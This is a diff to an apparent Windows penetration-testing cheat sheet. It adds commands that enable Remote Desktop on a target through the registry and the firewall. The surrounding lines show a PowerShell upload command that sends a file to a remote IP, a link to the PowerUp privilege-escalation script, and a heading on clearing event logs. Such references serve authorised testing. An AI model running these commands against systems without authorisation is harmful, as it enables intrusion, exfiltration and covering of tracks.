@@ -382,7 +382,6 @@ $WebClient.UploadFile($url, (Get-Location).Path + "\" + $filename)
 
 `./upload.ps1 https://192.168.46.1:4433/ admin:password file_to_upload`
 
-
 ## PowerUp.ps1
 
 Link https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
@@ -484,6 +483,17 @@ On Target
 
 ### Empire
 
+## Enable RDP
+
+Requires admin privilege
+
+Enable the remote desktop protocol
+
+`Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0`
+
+Enable remote desktop through the Windows Firewall
+
+`Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
 
 ## Clear Event Logs
